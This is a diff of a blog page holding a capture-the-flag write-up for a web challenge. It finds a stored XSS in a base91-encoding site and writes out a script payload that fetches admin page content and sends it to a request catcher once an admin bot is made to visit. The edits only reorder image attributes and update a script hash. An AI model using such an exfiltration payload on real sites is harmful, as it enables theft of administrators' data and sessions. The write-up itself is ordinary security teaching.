@@ -82,7 +82,6 @@ After signing up and logging in as a normal user, we can navigate to the /create
 
 
 
-
     <meta property="article:published_time" content="2023-10-16 18:48:00 &#43;0200 CEST" />
 
 
@@ -164,11 +163,11 @@ After signing up and logging in as a normal user, we can navigate to the /create
 <p>Link: <a href="https://based.skin/">https://based.skin</a></p>
 <p>Files: BASED.zip</p>
 <p>When we open the link, we are prompted to visit a website where we can register or log in.</p>
-<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-14-41.png" alt="Screenshot from 2023-10-16 23-14-41.png"></p>
-<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-14-51.png" alt="Screenshot from 2023-10-16 23-14-51.png"></p>
+<p><img alt="Screenshot from 2023-10-16 23-14-41.png" src="/images/based_encoding/Screenshot_from_2023-10-16_23-14-41.png"></p>
+<p><img alt="Screenshot from 2023-10-16 23-14-51.png" src="/images/based_encoding/Screenshot_from_2023-10-16_23-14-51.png"></p>
 <p>After signing up and logging in as a normal user, we can navigate to the /create page. Here, we can input text, and the website will encrypt it and save it in its database.</p>
-<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-15-16.png" alt="Screenshot from 2023-10-16 23-15-16.png"></p>
-<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-15-26.png" alt="Screenshot from 2023-10-16 23-15-26.png"></p>
+<p><img alt="Screenshot from 2023-10-16 23-15-16.png" src="/images/based_encoding/Screenshot_from_2023-10-16_23-15-16.png"></p>
+<p><img alt="Screenshot from 2023-10-16 23-15-26.png" src="/images/based_encoding/Screenshot_from_2023-10-16_23-15-26.png"></p>
 <p>In the provided .zip file, you can find examples of both encoding and decoding implementations. The encryption method used is base91, and the alphabet used for this encryption is as follows:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
 </span></span><span style="display:flex;"><span>
@@ -185,14 +184,14 @@ After signing up and logging in as a normal user, we can navigate to the /create
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decode</span>(encoded_str): <span style="color:#f92672">...</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode</span>(bindata): <span style="color:#f92672">...</span>
 </span></span></code></pre></div><p>To check our encodings, we can visit the main page. Each encoding has its unique ID.</p>
-<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-15-34.png" alt="Screenshot from 2023-10-16 23-15-34.png"></p>
+<p><img alt="Screenshot from 2023-10-16 23-15-34.png" src="/images/based_encoding/Screenshot_from_2023-10-16_23-15-34.png"></p>
 <p>Another action we can take is reporting an encoding to the admin by providing the corresponding ID.</p>
-<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-15-56.png" alt="Screenshot from 2023-10-16 23-15-56.png"></p>
+<p><img alt="Screenshot from 2023-10-16 23-15-56.png" src="/images/based_encoding/Screenshot_from_2023-10-16_23-15-56.png"></p>
 <p>The first thing that comes to mind, especially after reading the note at the top of the page mentioning &ldquo;an admin going there,&rdquo; is the possibility of stealing credentials through an XSS attack. Let&rsquo;s check if the website is vulnerable.</p>
-<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-56-09.png" alt="Screenshot from 2023-10-16 23-56-09.png"></p>
+<p><img alt="Screenshot from 2023-10-16 23-56-09.png" src="/images/based_encoding/Screenshot_from_2023-10-16_23-56-09.png"></p>
 <p>After confirming that the encoding works correctly, we can input the XSS payload and observe how the website responds.</p>
-<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-33-25.png" alt="Screenshot from 2023-10-16 23-33-25.png"></p>
-<p><img src="/images/based_encoding/Screenshot_from_2023-10-16_23-33-31.png" alt="Screenshot from 2023-10-16 23-33-31.png"></p>
+<p><img alt="Screenshot from 2023-10-16 23-33-25.png" src="/images/based_encoding/Screenshot_from_2023-10-16_23-33-25.png"></p>
+<p><img alt="Screenshot from 2023-10-16 23-33-31.png" src="/images/based_encoding/Screenshot_from_2023-10-16_23-33-31.png"></p>
 <p>The XSS has been triggered, the website is vulnerable!</p>
 <p>Before crafting the payload, it&rsquo;s essential to note that the base91 alphabet doesn&rsquo;t accept certain characters, such as &ldquo;.&rdquo;. To fetch admin data, we need a payload like this:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>to_enc_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;script&gt;</span><span style="color:#ae81ff">\
@@ -212,7 +211,7 @@ After signing up and logging in as a normal user, we can navigate to the /create
 </span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">        body: x</span><span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    }))</span><span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&lt;/script&gt;ciao&#39;</span>
-</span></span></code></pre></div><p><img src="/images/based_encoding/Screenshot_from_2023-10-17_00-11-03.png" alt="Screenshot from 2023-10-17 00-11-03.png"></p>
+</span></span></code></pre></div><p><img alt="Screenshot from 2023-10-17 00-11-03.png" src="/images/based_encoding/Screenshot_from_2023-10-17_00-11-03.png"></p>
 <p>Let&rsquo;s send the payload on the /create page.</p>
 <p>Now, to trigger the XSS, we need an admin to open the page. We can achieve this by reporting the ID of the document containing the malicious JavaScript and then wait for a response in the request catcher.</p>
 <p>This is what I obtained:</p>
@@ -317,7 +316,7 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
   &lt;/div&gt;
 &lt;/body&gt;
 </code></pre><p>Let’s open the link it references and… Here’s the flag!</p>
-<p><img src="/images/based_encoding/Screenshot_from_2023-10-17_00-16-42.png" alt="Screenshot from 2023-10-17 00-16-42.png"></p>
+<p><img alt="Screenshot from 2023-10-17 00-16-42.png" src="/images/based_encoding/Screenshot_from_2023-10-17_00-16-42.png"></p>
 
             </div>
         </article>
@@ -345,7 +344,7 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
 
 
 
-<script type="text/javascript" src="/bundle.min.46e438bd2eca7eb6358c700b40f6f56b22ab0b92503ecc11a2d8e4bcc610b8b4da83e5ea3d3e84fdb5f3c3c765744b9f5bbaf43cf5a027910be07ee39a9c12a1.js" integrity="sha512-RuQ4vS7KfrY1jHALQPb1ayKrC5JQPswRotjkvMYQuLTag&#43;XqPT6E/bXzw8dldEufW7r0PPWgJ5EL4H7jmpwSoQ=="></script>
+<script type="text/javascript" src="/bundle.min.85fad2de4f13fec3bcb3b3cb10430cdb44a7b4a9749b32938241a5c6e77718df7624f1002b880521fdc26e24ec1077fda214bf1cb36ee3045510760d09638cae.js" integrity="sha512-hfrS3k8T/sO8s7PLEEMM20SntKl0mzKTgkGlxud3GN92JPEAK4gFIf3CbiTsEHf9ohS/HLNu4wRVEHYNCWOMrg=="></script>
 
 
 
